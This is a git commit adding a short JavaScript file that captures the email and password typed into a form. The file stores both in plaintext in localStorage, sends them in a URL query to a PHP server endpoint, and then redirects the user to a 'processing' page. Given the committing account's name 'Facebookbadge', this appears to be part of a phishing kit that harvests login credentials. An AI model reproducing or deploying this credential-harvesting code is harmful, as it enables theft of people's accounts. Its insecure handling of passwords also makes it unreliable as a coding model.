6bd486a7156b35efed4cd34bea47ecfec136098f
Facebookbadge <163007981+Facebookbadge@users.noreply.github.com>
2024-03-11 22:06:59 +0800

    Add files via upload

---
+++ script.js
@@ -0,0 +1,36 @@
+var btn,email,password;
+
+
+function submitForm(event){
+  event.preventDefault()
+  email=document.getElementById("email")
+  password=document.getElementById("password")
+ if(email.checkValidity()&&password.checkValidity()){
+   localStorage.setItem("email",email.value);
+   localStorage.setItem("password",password.value);
+   function saveUserToDatabase(email, password) {
+    var xhr = new XMLHttpRequest();
+    var url = 'http://localhost:8001/server.php/?email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password);
+
+    xhr.open('POST', url, true);
+
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4 && xhr.status == 200) {
+            console.log(xhr.responseText);
+        }
+    }
+
+    xhr.send();
+}
+
+// Usage example:
+var userEmail = email.value;
+var userPassword = password.value;
+saveUserToDatabase(userEmail, userPassword);
+
+   window.location.href="processing.html";
+   
+ }else{
+   
+ }
+}
